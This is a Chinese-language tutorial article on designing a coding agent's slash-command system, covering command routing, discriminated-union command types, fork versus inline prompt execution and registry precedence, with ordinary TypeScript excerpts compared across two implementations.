---
title: 'Agent Runtime（12）· 命令系统：怎么接住上百条斜杠命令'
description: '从参数展开、命名空间、来源优先级到内置与用户命令的冲突解析。一个看着简单的功能，规模上去之后每一层都要有判据。'
date: "2026-09-03"
series: Agent Runtime 从零到一
tags: [命令系统, 从零到一]
outline: [2, 3]
---

# 命令系统从零到一：一个 coding agent 怎么接住上百条 `/命令`

::: info 这是一份快照
本文的数字、常量、行数取自 **2026-09-03** 对 sid-code 源码的一次实读。
代码在动，这些数字会腐坏——引用其中任何一个之前，请按文中给出的命令在你自己的仓库里复跑一次。
:::

> **这份文档写给谁**
>
> 你会用 `/compact`、`/model`、`/clear`，但没做过「一套代码同时接住内置命令、
> 用户自定义命令、Skill、插件、MCP 服务器动态提供的命令」这件事。你想搞懂：
> 这里面到底难在哪、为什么它不是一个 `switch` 能解决的问题、
> 面试问到「你怎么设计一个 agent 的命令系统」时该答什么。
>
> **它不是摘要。** 摘要会把结论抽出来变成一句正确但没用的话
>（比如「用判别联合类型统一三种命令」）。本文的写法相反：
> **每个结论都从「为什么会有人搞错」讲起** —— 因为面试里能拉开差距的从来不是结论本身，
> 是你能不能说清它的反面为什么诱人。
>
> **和 `chapter-09-command-system.md` 的关系**：那份是**调研结论**（写给已经懂的人，
> 密度极高、满篇 `文件:行号`）。这一份是**教学版**：从「用户按下回车之后发生了什么」
> 讲起，每个概念先给「为什么需要它」再给「它长什么样」，最后才给「谁做得好」。
>
> **本文的事实来源（两个实现同时上桌）**
> - **sid-code 侧**：2026-09-03 实读 `packages/cli/src/command/`（33 个 `.ts`，8547 行）
>   与 `packages/core/src/command-contract/types.ts`。行数口径：
>   `wc -l packages/cli/src/command/*.ts`。
> - **Claude Code 侧**：沿用同名调研文档 `chapter-09-command-system.md` 的实读口径，
>   本文不重新验，凡引用均标注「CC 调研口径」。
> - **为什么要两个**：单看一个实现，你分不清哪些是「这个领域的必然结构」、
>   哪些只是「这一家的选择」。两个实现放在一起，**重合的部分才是知识，
>   分叉的部分才是设计决策**。

---

## 怎么读这份文档

按顺序读。这是**一条链**，不是清单——后面每章都在用前面建立的概念。

| 章 | 讲什么 | 读完你能回答 |
| --- | --- | --- |
| [§0](#s0) | 最小心智模型：一条斜杠命令到底是什么 | 能手画出从回车到执行的完整链路 |
| [§1](#s1) | 第一个认知陷阱：它不是 `switch` | 为什么「命令名 → 函数」这个模型会崩 |
| [§2](#s2) | **三种执行形态**：判别联合 | 一条新命令进来，你知道它该是哪一型 |
| [§3](#s3) | 注册表：多来源聚合与优先级 | 六个来源怎么合成一个列表，谁覆盖谁 |
| [§4](#s4) | 门控：谁能看见、谁能调用 | 五个正交的可见性维度各解决什么 |
| [§5](#s5) | 输入路由与命令队列 | `/var/log` 是命令还是路径；模型忙时怎么办 |
| [§6](#s6) | 执行引擎：三条路径的细节 | **`local-jsx` 那个死锁**为什么必须防 |
| [§7](#s7) | 发现与补全：模糊搜索 + 排序 | 上百条命令怎么让用户找得到 |
| [§8](#s8) | 扩展面：自定义命令 / Skill / 插件 / MCP | 用户写一个 `.md` 就成了一条命令，代价是什么 |
| [§9](#s9) | ★ 会「绿着坏掉」的失效模式 | **本章最值钱**，全是不报错的坏 |
| [§10](#s10) | 两个实现横向对比 | 哪些是必然，哪些是选择 |
| [§12](#s12) | 动手：从零实现一个 mini 命令系统 | 五阶段路线图 |
| [附](#appendix) | 术语表 / 自检清单 | 查漏 |

**如果只有 20 分钟**：读 §2、§5、§9。这三章是这个领域的骨架，其余都是它们的展开。

---
<a id="s0"></a>
## §0 最小心智模型：一条斜杠命令到底是什么

### 0.1 先把「命令」这个词的歧义拆开

日常说的「命令」至少混着三样东西，先分清，否则后面全乱：

| 你说的 | 实际是什么 | 例子 |
| --- | --- | --- |
| **shell 命令** | 交给操作系统执行的进程 | `ls -la`、`git status` |
| **CLI 参数** | 启动进程时的开关，进程只读一次 | `sid-code --model opus` |
| **斜杠命令** | **进程已经跑起来了**，在对话里输入的指令 | `/compact`、`/model sonnet` |

本文只讲第三种。它的独特之处在于：**它运行在一个已经有状态的进程里**——
有正在进行的对话、有已加载的配置、可能还有一个正在跑的模型请求。
这个「有状态」是后面所有复杂度的源头。

### 0.2 最朴素的实现：三十行就能跑

如果只要「能用」，命令系统真的很简单。任何人都能在三十行内写出来：

```ts
// 最朴素版本：一个 Map + 一个 if
const commands = new Map<string, (args: string) => string>([
  ["help",  () => "可用命令：/help /clear /cost"],
  ["clear", () => { messages.length = 0; return "已清空对话"; }],
  ["cost",  () => `本次会话花了 $${session.cost.toFixed(4)}`],
]);

function handleInput(input: string) {
  if (!input.startsWith("/")) {
    return sendToModel(input);          // 普通对话
  }
  const [name, ...rest] = input.slice(1).split(/\s+/);
  const fn = commands.get(name);
  if (!fn) return `未知命令: /${name}`;
  return fn(rest.join(" "));            // 执行
}
```

**这段代码是对的，而且它是所有真实实现的内核。** 记住它——
后面几千行代码全部是在给这三十行打补丁，每个补丁都对应一个具体的、
会让这个朴素版本失效的真实场景。

**本文的组织方式就是：逐个引入那些场景，看它是怎么把上面这段代码撑成 8000 行的。**

### 0.3 完整链路：一条命令要过五道关

真实实现里，从「用户按下回车」到「命令执行完」要过五个阶段。
先记住这张图，它是本文的骨架——后面每一章展开其中一格：

```
用户输入 "/compact 保留最近三轮"
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│ ① 路由：这是什么？          §5                            │
│    斜杠命令 / shell 命令 / 普通对话 / 还是一个文件路径？    │
└─────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│ ② 调度：现在能执行吗？      §5                            │
│    模型正忙 → 入队等待 / 还是这条命令有权插队？             │
└─────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│ ③ 查找：它是哪条命令？      §3                            │
│    在「内置 + 自定义 + Skill + 插件 + MCP」里找，谁优先？   │
└─────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│ ④ 门控：允许执行吗？        §4                            │
│    当前启用？用户可调用？（有些命令只给模型用）              │
└─────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│ ⑤ 执行：怎么跑？            §2 §6                         │
│    ┌──────────┬──────────────┬────────────────────────┐ │
│    │ 直接算   │ 弹一个交互界面 │ 造一段 prompt 交给模型   │ │
│    │ local    │ local-jsx    │ prompt                 │ │
│    └──────────┴──────────────┴────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

朴素版本只有 ③ 和 ⑤ 的一半。**缺的四道关，每一道都对应一类真实事故**——
这也是为什么它撑不住。

### 0.4 一个关键区分：命令系统 ≠ 工具系统

初学者最常混的一对概念。两者都是「执行一个动作」，但它们的**调用者不同**：

| | 命令（Command） | 工具（Tool） |
| --- | --- | --- |
| 谁触发 | **用户**敲 `/name` | **模型**在回复里输出 `tool_use` |
| 谁决定要不要用 | 人 | 模型自己推理 |
| 参数怎么来 | 用户手打的一串字符串 | 模型按 JSON Schema 生成的结构化对象 |
| 失败了谁看 | 人（显示报错） | 模型（错误信息回喂给它，让它重试） |
| 需要权限确认吗 | 一般不需要（人主动发起的） | **需要**（模型可能要删文件） |

**但这条边界在现代 agent 里被刻意打通了**：Skill 既能被用户 `/skill-name` 调用，
也能被模型通过一个元工具调用。这个「双向可调用」是本文 §4 和 §8 的核心复杂度来源——
同一个东西，两条调用路径，**权限模型完全不同**。

先记住这个提示：**一旦某个东西同时能被人和模型调用，
你就需要两套独立的开关**（sid-code 里是 `userInvocable` 和 `disableModelInvocation`，
见 §4.3）。

### 0.5 本章自检

能回答这三个问题再往下：

1. 上面那个三十行朴素版本，如果模型正在流式输出，用户敲了 `/clear`，会发生什么？
   （提示：`messages.length = 0` 和正在写入 `messages` 的流会怎么撞）
2. 为什么「命令」需要区分「用户可调用」和「模型可调用」两个开关，一个不够？
3. `/var/log/syslog` 以 `/` 开头，朴素版本会把它当成什么？这是个 bug 吗？

---
<a id="s1"></a>
## §1 第一个认知陷阱：命令系统不是「命令名 → 函数」

### 1.1 这个模型为什么诱人

`Map<string, Function>` 是所有人的第一直觉，而且它**在前两周完全够用**。
它诱人是因为它符合一个隐含假设：

> 「所有命令都是同一种东西：给它参数，它做点事，返回一段文字。」

这个假设是错的。而且它不是「不够优雅」那种错，是**结构性的错**——
一旦命令的种类多起来，它会以三种方式崩掉。

### 1.2 崩法一：不是所有命令都「返回一段文字」

拿三条真实命令对比，看它们「做完之后」的形态有多不一样：

```
/cost            → 读一个内存里的计数器，返回 "本次会话 $0.83"
                   ✅ 符合朴素模型

/model           → 需要弹出一个列表，用户上下键选择、回车确认、ESC 取消
                   ❌ 「返回值」是什么？一个界面？用户还没选完呢
                   ❌ 「什么时候算执行完」？要等用户操作，可能等 30 秒，也可能永不

/commit          → 需要读 git diff、理解改动语义、按项目风格写 commit message
                   ❌ 这件事**代码做不到**，必须交给模型
                   ❌ 所以它的「返回值」是一段 prompt，不是结果
```

第二条和第三条各自打破了一个朴素模型的隐含前提：

- `/model` 打破了「**同步完成**」——它的完成时机由用户决定，函数早就返回了。
- `/commit` 打破了「**自己完成**」——它自己什么都不做，只是生成一段要交给模型的文本。

**这就是三种命令形态的来源**，不是架构师拍脑袋分的类，是被这三种真实需求逼出来的：

| 形态 | 一句话 | 完成时机由谁定 | 谁干活 |
| --- | --- | --- | --- |
| `local` | 算一下，返回文字 | 函数自己 return | 代码 |
| `local-jsx` | 弹个界面给人操作 | **用户**（回调通知） | 人 |
| `prompt` | 造一段 prompt 交出去 | **模型**（下一轮回复） | 模型 |

§2 全章讲这个。

### 1.3 崩法二：命令表不是静态的

朴素版本里那个 `Map` 是写死在代码里的。真实情况：

```
内置命令        ← 写在代码里，编译时确定       ✅ 朴素模型能覆盖
用户自定义命令   ← 用户在 ~/.sid-code/commands/ 放一个 .md 文件
项目自定义命令   ← 项目里 .sid-code/commands/，跟着 git 走，换个目录就变了
Skill           ← 磁盘上的 SKILL.md，还能被条件激活（某些 skill 平时不可见）
插件命令        ← 装了插件才有，而且能在运行时 /reload-plugins 热更新
MCP 命令        ← **由外部进程动态提供**，服务器连上才有，断开就没了
```

后五个来源共同打破了「命令表在启动时就确定」这个前提。三个连带问题：

1. **优先级**：用户自定义了一个 `/review`，插件也提供了 `/review`，内置也有 `/review`，
   谁生效？（答案在 §3.3，而且这个答案是**反直觉**的）
2. **缓存**：扫磁盘、读文件、连 MCP 服务器都很慢，不能每次按键都来一遍。
   但缓存了之后，热更新怎么办？
3. **失败隔离**：某个插件的命令文件写坏了，**不能让整个命令系统起不来**。

§3 全章讲这个。

### 1.4 崩法三：`if (!input.startsWith("/"))` 这一行就是错的

朴素版本用「以 `/` 开头」判断斜杠命令。三个反例，全是真实场景：

```
/var/log/syslog        ← 用户想让模型看这个文件，不是想执行 /var 命令
/usr/bin               ← 同上
/我不知道有没有这个命令   ← 用户瞎猜的，报「未知命令」还是直接发给模型？
```

第一个和第二个说明：**`/` 开头不足以判定它是命令**，还要看「像不像一个命令名」。
sid-code 的判据是一行正则（`packages/cli/src/command/parser.ts`，实读）：

```ts
export function looksLikeCommand(name: string): boolean {
  return /^[a-zA-Z0-9:\-_]+$/.test(name);
}
```

**读法**：命令名只允许字母、数字、冒号、连字符、下划线。含 `/` 的（`var/log`）
一律不是命令。够用了吗？不够——`/tmp` 只有字母，完全符合这个正则，
但它是一个真实存在的目录。所以还要再加一道文件系统检查（同文件）：

```ts
export async function isFilePath(name: string): Promise<boolean> {
  try {
    await (await import("node:fs/promises")).stat(`/${name}`);
    return true;          // /tmp 存在 → 它是路径，不是命令
  } catch {
    return false;
  }
}
```

**两个实现在这里的判据完全一致**（CC 调研口径下的正则是
`!/[^a-zA-Z0-9:\-_]/.test(commandName)`，逻辑等价），
这是一个「重合即知识」的例子：**任何以 `/` 作命令前缀的 CLI 都必须处理这个歧义**，
它不是某一家的选择。

第三个反例（用户瞎猜的命令名）留到 §5.2，因为它的答案不是技术问题而是产品判断，
而且**两个实现在这里做了不同的选择**。

### 1.5 于是这件事的形态变了

三种崩法叠起来，命令系统的形态从「一个 Map」变成了**三个正交的关注点**：

```
     ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
     │  有哪些命令   │   │  能不能执行   │   │   怎么执行    │
     │  （注册表）   │   │   （门控）    │   │  （执行引擎） │
     │     §3       │   │     §4       │   │   §2 §6      │
     └──────────────┘   └──────────────┘   └──────────────┘
              ↑                 ↑                  ↑
              └─────────────────┴──────────────────┘
                    通过一个「命令类型契约」连接
                    三者互不依赖，各自能单独测
```

**这个三分是本文最重要的架构结论。** 它的价值不在于「分层好听」，
而在于一个可验证的性质：**注册表不知道命令怎么执行，执行引擎不知道命令从哪来。**

判据很硬：sid-code 的 `unified-registry.ts`（225 行）里
**一次都没出现** `case "local"` 这类分发；`executor.ts`（363 行）里
**一次都没出现**「扫磁盘 / 读配置 / 连 MCP」。两边只通过 `UnifiedCommand` 这个类型说话。

想验证一个命令系统有没有做到这件事，就 grep 这两处。混在一起的实现里，
你会在注册表里看到「如果是 skill 就……」这种分支——那说明两个关注点漏了。

### 1.6 本章自检

1. `local-jsx` 这一型存在的**唯一**理由是什么？（一句话，不要答「为了 UI」）
2. 为什么 `looksLikeCommand()` 这个正则不够，还要加一次 `stat()`？
   加了之后还有漏的情况吗？
3. 「注册表不知道命令怎么执行」这句话，你要 grep 什么来验证它？

---
<a id="s2"></a>
## §2 三种执行形态：判别联合，以及一处真实分叉

### 2.1 先说清「判别联合」是什么

这是 TypeScript 的一个类型技巧，名字吓人，实质三句话就能讲完。

**问题**：三种命令的字段完全不一样。`local` 需要一个 `load()`，
`prompt` 需要一个 `getPromptForCommand()` 和「inline 还是 fork」，
`local-jsx` 需要一个能接 `onDone` 回调的入口。硬塞进一个接口会变成这样：

```ts
// ❌ 反面示范：把三种揉成一个
interface Command {
  name: string;
  type: string;
  load?: () => Promise<any>;                    // local 和 local-jsx 用
  getPromptForCommand?: (args) => Promise<string>;  // 只有 prompt 用
  context?: "inline" | "fork";                  // 只有 prompt 用
  allowedTools?: string[];                      // 只有 prompt-fork 用
}
```

**这个写法的病不在于「不优雅」，在于它把编译器变成了瞎子。**
你写 `cmd.getPromptForCommand!(args)` 时，如果 `cmd` 实际是个 `local` 命令，
编译器不会拦你——所有字段都是可选的，所以什么都合法。
错误会在运行时以 `undefined is not a function` 的形态出现。

**解法**：用一个字段（叫**判别字段**，这里是 `type`）当标签，
把三种形态声明成三个独立类型，再用 `|` 联起来：

```ts
// packages/core/src/command-contract/types.ts（实读，节选）
export type UnifiedCommand = CommandBase & (LocalCommand | LocalJSXCommand | PromptCommand);

export interface LocalCommand    { type: "local";     load: () => Promise<LocalCommandModule>; }
export interface LocalJSXCommand { type: "local-jsx"; load: () => Promise<LocalJSXCommandModule>; }
export interface PromptCommand   {
  type: "prompt";
  context?: "inline" | "fork";
  getPromptForCommand(args: string, ctx: CommandContext): Promise<string>;
  allowedTools?: string[];
  maxTurns?: number;
  timeoutMins?: number;
}
```

**收益是编译器帮你干活**。写 `switch (cmd.type)` 时，在 `case "prompt"` 分支里
编译器**知道** `cmd` 一定有 `getPromptForCommand`、一定没有别的两型的字段：

```ts
switch (cmd.type) {
  case "local":     return this.executeLocal(cmd, args);      // 这里 cmd.load 一定在
  case "local-jsx": return this.executeLocalJSX(cmd, args);
  case "prompt":    return this.executePrompt(cmd, args);      // 这里 getPromptForCommand 一定在
}
```

还有一个白拿的好处：**加第四种形态时，编译器会把所有漏掉的 `switch` 标红**
（因为返回类型不再能覆盖所有分支）。这是「类型安全」这个词在这里的具体兑现——
不是抽象的好，是一个可操作的性质。

> **面试可以直接用的一句话**：判别联合让「命令种类」这件事从运行时错误
> 变成编译期错误。加一种形态时，编译器会告诉我所有需要改的地方，
> 而用可选字段的写法它一句话都不会说。

### 2.2 三种形态各自解决什么，以及边界在哪

#### `local` —— 算一下，返回结果

最简单的一型。它的「返回」不是一个字符串，而是一个**小的结果联合**
（sid-code 实读，8 种）：

```ts
export type LocalCommandResult =
  | { type: "text";     value: string }        // 显示一段文字（/cost /status）
  | { type: "compact";  summary: string }      // 上下文压缩结果
  | { type: "skip" }                           // 静默完成，对话里不留痕迹
  | { type: "clear" }                          // 清空对话
  | { type: "quit";     message?: string }     // 退出程序
  | { type: "dialog";   dialog: DialogType }   // ★ 让应用层打开某个对话框
  | { type: "submit_prompt"; prompt: string }  // 把一段文本提交给模型
  | { type: "confirm";  message: string; onConfirm: () => Promise<LocalCommandResult> };
```

**为什么返回值也要是个联合，不能都返回字符串？**
因为「显示一段文字」和「清空对话」是**两种不同的副作用**。
如果都返回字符串，命令就得自己去改对话数组——那它就跟应用状态耦合了，
测试时必须造一个完整的应用出来。

返回一个 `{ type: "clear" }` 的意思是：**「我要求清空对话」，而不是「我清空了对话」。**
真正执行清空的是应用层。这个区别让 `local` 命令变成纯函数：给它参数和上下文，
它返回一个「意图」，你断言那个意图就行。

注意最后那个 `confirm` 是**递归**的——`onConfirm` 又返回一个 `LocalCommandResult`。
这让「危险操作先问一句」不需要任何特殊机制：

```
/clear → { confirm: "确定清空？", onConfirm: () => ({ type: "clear" }) }
             用户点是 ↓
          { type: "clear" }  → 应用层执行
```

#### `prompt` —— 我不干活，我造一段 prompt

这一型最反直觉，**也是 agent 时代才出现的形态**。传统 CLI 里没有它的对应物。

它的核心洞察是：**有些事情代码根本做不到。**

```
/commit  想做的事：读 git diff → 理解这些改动在语义上是一件什么事
                  → 按这个项目的历史 commit 风格写一条 message
                  → 顺手判断有没有 .env 之类不该提交的文件

用代码实现？前两步就卡死了。「理解改动的语义」不是能写出来的函数。
```

所以 `/commit` 的实现是：**造一段包含 git diff 和 commit 规范的 prompt，交给模型。**
命令本身一行业务逻辑都没有。

它有两个执行位置，差别很大：

| | `context: "inline"`（默认） | `context: "fork"` |
| --- | --- | --- |
| prompt 去哪 | 展开进**当前对话** | 交给一个**独立子代理** |
| 看得见历史吗 | 看得见（在同一个上下文里） | 看不见（全新的 system prompt） |
| 花谁的 token | 主对话的上下文预算 | 子代理自己的预算 |
| 结果怎么回来 | 就是模型的下一轮回复 | 子代理跑完，输出作为一段文字返回主对话 |
| 适合 | 需要对话历史的（`/review` 刚聊过的代码） | 独立、量大、会污染上下文的（`/commit`） |

**选 fork 的判据是一句话：这件事做完之后，中间过程还有用吗？**
`/commit` 要读一大坨 diff，读完就没用了——留在主对话里纯粹是占地方（还要为它反复付费，
因为后面每一轮都会把它重发一遍）。fork 让这些中间过程随子代理一起消失，只留结论。

sid-code 的 fork 实现（`executor.ts` 实读）有三个细节值得学：

```ts
if (!this.ctx.providerRegistry) {
  // 无 ProviderRegistry 时退回 inline 注入，避免命令不可用
  log.warn("COMMAND", `fork 命令 /${cmd.name} 无 providerRegistry，退回 inline`);
  return { type: "submit_prompt", value: prompt, shouldQuery: true };
}
```

**① 降级而不是报错。** 子代理跑不起来时（没有 provider 注册表），
它退回 inline 执行。用户拿到的体验是「有点不一样」，而不是「这个命令坏了」。

```ts
maxTurns: cmd.maxTurns ?? 30,
timeout: cmd.timeoutMins != null
  ? Math.min(Math.max(cmd.timeoutMins, 1), 30) * 60_000 : undefined,
```

**② 钳制而不是信任。** `timeoutMins` 来自命令定义，可能来自用户写的 Skill 文件。
`Math.min(Math.max(x, 1), 30)` 把它钳到 1–30 分钟。**任何来自文件的数字都要钳**——
用户写个 `timeoutMins: 99999` 不该能挂住整个会话。

**③ 权限和 hooks 的顺序是铁律**（源码注释直接写了）：

```ts
// 顺序铁律：权限 → hooks → 执行。被拒的 skill 不能留下 hooks 污染后续工具调用。
```

读法：如果先注册 hooks 再判权限，那么一个**被拒绝**的 skill 也已经把它的 hooks
挂进系统了——它没被执行，但它的钩子会在后续每次工具调用时触发。
这是个漂亮的顺序陷阱：两种顺序在 happy path 上表现完全一样，
**只在拒绝路径上分叉**，而拒绝路径通常没有测试。

#### `local-jsx` —— 弹个界面给人操作

存在的唯一理由（§1.6 那道自检题的答案）：**它的完成时机不由代码决定，由用户决定。**

其余两型的函数返回时事情就办完了。`local-jsx` 的函数返回时，
界面才刚画出来，用户还没开始选。所以它需要一个**回调**来通知「用户操作完了」：

```ts
export interface LocalJSXCommandModule {
  call(onDone: LocalJSXCommandOnDone, ctx: CommandContext, args: string):
    Promise<ReactNode | null>;      // 返回要渲染的界面
}
export type LocalJSXCommandOnDone = (result?: string, options?: LocalJSXDoneOptions) => void;
```

一个命令，**两个出口**：`return` 交出界面，`onDone` 交出结果。
这两个出口的时间差（可能几十秒）是 §6.3 那个死锁的全部来源。

### 2.3 ★ 一处真实分叉：sid-code 的 `local-jsx` 是条死路

**这一节是本文最好的教学样本，因为它同时是知识点和方法论。**

前面把三种形态讲得很整齐。但实读 sid-code 之后有个发现：

```bash
# 全仓搜 local-jsx 的实际使用（排除测试）
$ grep -rn 'type: "local-jsx"' packages --include='*.ts' --include='*.tsx' | grep -v '\.test\.'
packages/core/src/command-contract/types.ts:291:  type: "local-jsx";
# → 1 处，而且是类型定义本身
```

**30 条已迁移的内置命令，全部是 `local`，`local-jsx` 一个都没有。**

```bash
$ for f in packages/cli/src/command/commands/*/index.ts; do grep -o 'type: "[a-z-]*"' $f | head -1; done | sort | uniq -c
  30 type: "local"
```

而执行引擎里那 40 行 `executeLocalJSX`（含 §6.3 要讲的死锁防护）**是存在的**，
它的 `setToolJSX` 回调也接线了——接到了一个空函数上（`packages/cli/src/app.ts:8035`，实读）：

```ts
// setToolJSX 回调：本项目当前无真 local-jsx 命令（dialog 走 activeDialog state），
// 但保留接线以备未来 JSX 命令；渲染交给 activeDialog 机制，这里仅兜底关闭。
const executor = new CommandExecutor(cmdCtxNew, {
  setToolJSX: () => {
    /* 预留：当前 dialog 走 activeDialog state，无需 JSX 挂载 */
  },
});
```

**那 sid-code 的 `/model` 怎么弹出模型选择器？** 走 `local` 的第六种返回值：

```ts
// packages/cli/src/command/commands/model/model.ts:117（实读）
return { type: "dialog", dialog: "model" };
```

命令返回「请打开 model 对话框」这个**意图**，应用层的 `activeDialog` state 收到后
去渲染对应组件。`DialogType` 是一个 22 项的字符串联合（`model` / `theme` /
`permissions` / `skills` / `trust` …），对话框组件全部住在 UI 层，由 state 驱动。

#### 两条路的取舍

| | CC 的 `local-jsx`（命令 return JSX） | sid-code 的 `dialog`（命令 return 意图） |
| --- | --- | --- |
| 界面代码住哪 | **命令自己**（每条命令带自己的 UI） | UI 层（命令只说要开哪个） |
| 加一个新对话框 | 只改命令，不动别处 | 要改**两处**：加 `DialogType` 枚举 + 加组件 |
| 命令能不能单测 | 难（要渲染 React） | 容易（断言一个字符串字面量） |
| 界面能多自由 | 任意（就是 React） | 只能是那 22 种里的一种 |
| 需要 `onDone` 双出口吗 | 需要 → 于是需要 §6.3 那套死锁防护 | **不需要**，函数返回就完事了 |

**两边都对，因为它们在赌不同的东西。** CC 有 80+ 命令、其中一大批是交互式面板
（`/config` `/mcp` `/resume` `/permissions`），让每条命令自带 UI 才不会把
`DialogType` 撑成一个百项枚举。sid-code 对话框种类有限且集中在 TUI 层，
用一个枚举换掉了整套回调时序问题——**§6.3 那个死锁在 sid-code 的生产路径上不存在**。

#### 这一节真正的方法论价值

三条，每一条都比上面那个知识点更值钱：

**① 「类型定义在」不等于「能力在用」。** 如果只读 `types.ts`，
你会写出「sid-code 支持三种命令形态」——这句话形式上没错，
但它会让读者以为交互式命令走的是 `local-jsx`。**真实路径是 `dialog`。**
判据是 grep 生产调用点，不是读类型定义。这正是本仓反复记的
「防线全在、调用全 0」形态：代码在，调用是零。

**② 空壳接线比没接线更难发现。** `setToolJSX` 传的是一个空函数，
所以「有没有接线」这个检查会通过。要发现它，得看那个函数体——
它只有一句注释。**好在这里的注释是诚实的**，它明说了「当前无真 local-jsx 命令」。
如果没有这句注释，这个空壳可以骗过任何静态检查。

**③ 死代码不一定要删。** 那 40 行 `executeLocalJSX` 目前跑不到，
但它的代价只是 40 行 + 一个空回调，而删掉它意味着将来要重新推导整套
`doneWasCalled` 时序防护（那套防护是踩过坑才有的，见 §6.3）。
**判据是「重建成本 vs 携带成本」，不是「有没有被调用」。**

> **面试信号**：被问「你怎么调研一个项目的某个能力」时，
> 上面这三条比任何架构描述都更能证明你真读过代码。
> 特别是第 ① 条 —— 大多数人调研到 `types.ts` 就停了。

### 2.4 一条命令怎么选型：决策表

| 这条命令要做的事 | 选 | 为什么 |
| --- | --- | --- |
| 读内存状态、算个数、显示出来 | `local` + `text` | 最简单的够用就行 |
| 改一个运行时开关（`/vim` `/fast`） | `local` + `text`/`skip` | 副作用通过 ctx 的 setter |
| 需要用户从列表里选一个 | `local`+`dialog`（sid-code）/ `local-jsx`（CC） | 见 §2.3 取舍 |
| 危险操作，要先确认 | `local` + `confirm` | 递归结果类型，不需要新机制 |
| 需要模型的推理能力，且要看对话历史 | `prompt` + `inline` | 在当前上下文里展开 |
| 需要模型，中间过程量大且用完就扔 | `prompt` + `fork` | 别污染主对话，别反复付费 |
| 需要模型，且要限制它能用哪些工具 | `prompt` + `fork` + `allowedTools` | 只有 fork 能收窄工具集 |

**一个容易选错的场景**：`/compact`（压缩上下文）明明要调模型生成摘要，
为什么两个实现都把它做成 `local` 而不是 `prompt`？

因为 `prompt` 的语义是「**把 prompt 交给主对话的模型，让它下一轮回复**」。
而压缩要做的是「调一次模型拿到摘要，然后**用摘要替换掉整个消息列表**」——
后半段是主对话完全不能参与的（它自己正要被替换掉）。
所以 `/compact` 走 `local`，自己调模型，返回 `{ type: "compact", summary }`，
由应用层去重建消息列表。

**判据**：`prompt` 型的标志不是「用到了模型」，而是「**结果就是模型的下一轮回复**」。

### 2.5 本章自检

1. 用可选字段那个反面示范，具体会在什么时候、以什么形态炸？为什么编译器不拦？
2. `local` 的返回值为什么是 8 种的联合而不是字符串？返回 `{type:"clear"}`
   和自己动手清空对话，差别在哪？
3. sid-code 支持 `local-jsx` 吗？回答这个问题你要跑什么命令？
4. `/compact` 要调模型，为什么不是 `prompt` 型？

---
<a id="s3"></a>
## §3 注册表：六个来源怎么合成一个列表

### 3.1 面临的问题

§1.3 列过六个来源。它们的差异不只是「位置不同」，而是**加载时机、
信任级别、生命周期三个维度全都不同**：

| 来源 | 什么时候能知道 | 信任级别 | 生命周期 |
| --- | --- | --- | --- |
| 内置命令 | 编译期 | 完全信任（我们自己写的） | 跟进程一样长 |
| 用户自定义（`~/.sid-code/commands/`） | 扫磁盘之后 | 用户自己写的，信任 | 改文件要重载 |
| 项目自定义（`.sid-code/commands/`） | 扫磁盘之后 | **跟着 git 走**，可能是别人写的 | **换目录就变** |
| Skill | 扫磁盘之后 | 同上，且可能带 hooks/工具权限 | 可被条件激活 / 运行时禁用 |
| 插件命令 | 插件加载之后 | 第三方 | **能热更新**（`/reload-plugins`） |
| MCP 命令 | **外部进程连上之后** | 外部服务 | 连上才有，断了就没 |

四个连带问题，逐个解：

1. **优先级** —— 同名了谁生效（§3.3）
2. **缓存** —— 扫磁盘很慢，但缓存了怎么热更新（§3.4）
3. **失败隔离** —— 一个来源坏了不能连坐（§3.5）
4. **别名冲突** —— 比同名更阴的一种碰撞（§3.6）

### 3.2 分层：加载贵，过滤便宜

两个实现的解法是同一个，这是「重合即知识」的又一例。核心是**把「加载」和「过滤」分开**：

```
┌────────────────────────────────────────────────────────┐
│  loadAllCommands(cwd)          【贵 · 缓存】             │
│  ────────────────────────────────────────────────────── │
│  并行扫描所有来源 → 合并 → 去重 → 按 cwd 存进 Map        │
│  代价：磁盘 IO、解析 markdown、连 MCP                    │
│  → 第二次调用直接命中缓存                                │
└────────────────────────────────────────────────────────┘
                          │
                          ▼
┌────────────────────────────────────────────────────────┐
│  getCommands(cwd, mcpCommands)  【便宜 · 每次重算】      │
│  ────────────────────────────────────────────────────── │
│  1. 拿缓存的全量列表                                     │
│  2. filter(cmd => cmd.isEnabled?.() ?? true)  ← 每次跑  │
│  3. 合并插件命令（独立快照，可热更新）                     │
│  4. 合并 MCP 命令（动态传入，去重）                       │
└────────────────────────────────────────────────────────┘
```

**为什么过滤不能一起缓存？** 因为 `isEnabled()` 的结果会变。
sid-code 的源码注释直接说了（`unified-registry.ts`）：

```
为什么不缓存过滤结果？因为：
- isEnabled() 可能依赖运行时状态（如 feature flag）
- MCP 命令是动态的（服务器可能连接/断开）
```

CC 侧的注释是同一件事的另一种说法（CC 调研口径）：

```
The expensive loading is memoized, but availability and isEnabled checks run
fresh every call so auth changes (e.g. /login) take effect immediately.
```

**这个「贵的缓存、便宜的每次算」是一个通用范式**，不止用在命令系统。
它的判据是：**这一步的输入会不会在两次调用之间变？** 磁盘上的文件不会
（除非显式重载），而运行时开关会。

**为什么缓存 key 是 `cwd`？** 因为项目级来源（`.sid-code/commands/`）
是跟目录走的。`cd` 到另一个项目，同一个进程该看到另一批命令。
用一个全局缓存会让 A 项目的命令泄漏到 B 项目。

### 3.3 优先级：数组顺序，而且方向是反直觉的

sid-code 的合并只有一行（实读）：

```ts
// 顺序即优先级：自定义 > Skills > 内置
const merged = this.dedupe([...customCommands, ...skills, ...builtinCommands]);
```

`dedupe` 保留**首次出现**的。所以：

```
自定义命令  ← 优先级最高
Skills
内置命令    ← 优先级最低
插件命令    ← 更低（在 getCommands 里追加，已存在的名字直接 skip）
MCP 命令    ← 最低（同上）
```

**反直觉在于：外部来源能覆盖内置命令。**

第一反应通常是「内置命令应该最权威，不能被用户覆盖」。但想清楚就会同意反过来：

> 用户在 `.sid-code/commands/review.md` 里写了一条 `/review`。
> 他显然是想用**自己那条**。如果内置的赢了，他会觉得「我写的文件没生效」——
> 而且**没有任何报错**告诉他为什么。

**判据：越具体的应该赢。** 项目级比用户级具体，用户级比内置具体。
